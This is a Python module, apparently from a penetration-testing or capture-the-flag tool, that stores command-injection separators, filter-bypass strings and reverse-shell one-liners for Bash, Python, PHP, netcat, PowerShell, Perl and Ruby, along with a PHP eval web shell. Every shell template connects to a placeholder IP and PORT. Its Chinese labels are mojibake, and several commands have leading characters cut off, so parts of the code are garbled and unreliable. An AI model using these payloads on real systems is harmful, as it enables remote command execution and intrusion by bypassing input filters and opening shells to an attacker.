"""éææ¤å¨ã¥å / éå¶è Shell Payload å¦¯â³æ½¡."""
from typing import List, Dict

RCE_CMD: Dict[str, List[str]] = {
    "éææ¤å¨ã¥åé¾ç¬å¸´ç»?: [";", "|", "||", "&&", "&", "\\n", "%0a"],
    "ç»çç¸ç¼æ¡ç¹": [
        "{IFS} éæ©åº", "<> é²å¶ç¾é?, "{,} æ¾¶Ñå«­éå³°çå¯®â¬",
        "%09 å§æé©éæ°ã", "%0a é¹ã£î", "%0b é¨åæ´¿éæ°ã",
    ],
    "éæ½æ­çæ¥ç²«æ©?: [
        "éæç´©ééåª¶é? c'a't", "éå¶æ©é? c\\at",
        "é«æ°¶å¤ç»? /???/c?t", "éæ©åºé·å¼å¸´: ca$*t",
    ],
}

_REV_SHELL_TMPL = {
    "Bash": [
        ("bash éå¶è", "h -i > /d/tcp/IP/PORT 0 1"),
        ("bash 2>&1", "h -i > /d/tcp/IP/PORT 0>&1"),
        ("bash 5>", "h -i 5<> /d/tcp/IP/PORT 0> 5 1> 5 2> 5"),
    ],
    "Python": [
        ("python éå¶è",
         "y -c \"_import_('s').popen(_import_('b').b64decode('...').decode()).read()\""),
    ],
    "PHP": [
        ("php éå¶è",
         "p -r '$s=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        ("php æ¶â¬éã¨ç½",
         "p -r '\"<?php eval(_POST[1]);?>\" > shell.php'"),
    ],
    "NC": [
        ("nc éå¶è (æµ¼çµç²º)", "c IP PORT -e /bin/sh"),
        ("nc éå¶è (ç» ï¿ äº¾)", "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f"),
    ],
    "PowerShell": [
        ("ps éå¶è",
         "owers -c \"$c=New-Object Net.Sockets.TCPClient('IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::UTF8).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""),
    ],
    "Perl": [
        ("perl éå¶è",
         "erl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(\"STDOUT\",\">&S\");open(\"STDERR\",\">&S\");exec(\"/bin/sh -i\");'"),
    ],
    "Ruby": [
        ("ruby éå¶è",
         "uby -rsocket -e 'f=TCPSocket.open(\"IP\",PORT);exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f.fileno,f.fileno,f.fileno)'"),
    ],
}

RCE_BYPASS: Dict[str, List[str]] = {
    "ç¯å¥æ¤é¾ç¬å¸´ç»?: [";", "|", "||", "&&", "&", "%0a", "\\n"],
    "ç»çç¸ç¼æ¡ç¹": ["${IFS}", "$IFS$9", "<>", "{cmd,arg}", "%09", "%0a"],
    "éæ»æ½¬ç¼æ¡ç¹": [
        "$(echo L2ZsYWc=|base64 -d)",
        "${PATH:0:1}bin${PATH:0:1}sh",
    ],
    "éæ½æ­çæ¥ç²«æ©?: [
        "c'a't /fl'a'g", "c\\at /fl\\ag",
        "ca$*t", "/???/c?t /???/f??g",
        '"c"a"t" /f*',
    ],
}


def get_shell_types() -> list:
    return list(_REV_SHELL_TMPL.keys())


def get_shell(name: str) -> list:
    return _REV_SHELL_TMPL.get(name, [])


def get_rce_cmd() -> dict:
    return RCE_CMD


def get_rce_bypass() -> dict:
    return RCE_BYPASS
